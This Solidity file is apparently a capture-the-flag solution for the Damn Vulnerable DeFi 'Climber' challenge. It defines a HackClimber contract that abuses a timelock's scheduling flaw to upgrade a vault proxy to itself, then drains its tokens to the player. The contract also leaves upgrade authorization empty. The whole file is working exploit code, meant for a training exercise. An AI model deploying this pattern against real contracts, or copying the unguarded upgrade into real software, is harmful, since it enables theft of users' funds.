// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ClimberTimelock } from "./ClimberTimelock.sol";
import { ClimberVault } from "./ClimberVault.sol";
import "../DamnValuableNFT.sol";


contract HackClimber is UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;
    ClimberTimelock timelock;
    ClimberVault vault;
    bytes32 salt;
    bytes[] dataElements;

    constructor(
        ClimberTimelock _timelock,
        ClimberVault _vault
    ) {
        timelock = _timelock;
        vault = _vault;
    }

    // We're setting the data to use later in scheduleHack
    function setData(bytes[] memory _dataElements, bytes32 _salt) public {
        dataElements = _dataElements;
        salt = _salt;
    }

    // Calling the scheduleHack now that our contract has the PROPOSER_ROLE
    // Allow us to make the entire operation ready for execution once this function is finished
    function scheduleHack() public {
        address[] memory targets = new address[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(this);
        targets[3] = address(vault);
        uint256[] memory values = new uint256[](4);
        timelock.schedule(targets, values, dataElements, salt);
    }

    // Because this function is call throught delegate call from the "proxy"
    // We're tranfering the tokens from the vault to us
    function hack(address token, address player) public {
        IERC20(token).transfer(player, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}